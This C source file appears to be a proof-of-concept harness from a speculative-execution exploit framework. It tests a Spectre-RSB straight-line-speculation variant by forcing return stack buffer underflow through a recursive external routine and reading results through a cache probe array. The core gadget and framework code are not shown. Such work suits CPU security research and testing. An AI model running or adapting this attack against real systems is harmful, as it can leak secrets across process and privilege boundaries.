#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// SLS fallback: tests straight-line speculation after ret on RSB underflow

uint8_t* probe_array;
volatile uint8_t current_encode_value;
volatile int recurse_depth;

extern void sls_recurse(void);

void sls_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    for (int m = 0; m < 100; m++) {
        current_encode_value = encode_index;
        mfence();
        recurse_depth = 32;
        sls_recurse();
    }
}

int main() {
    exploit_ctx_t ctx = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-RSB SLS fallback\n");

    exploit_hooks_t hooks = {
        .setup   = NULL,
        .attack  = sls_attack,
        .cleanup = NULL
    };

    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("RSB SLS fallback", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
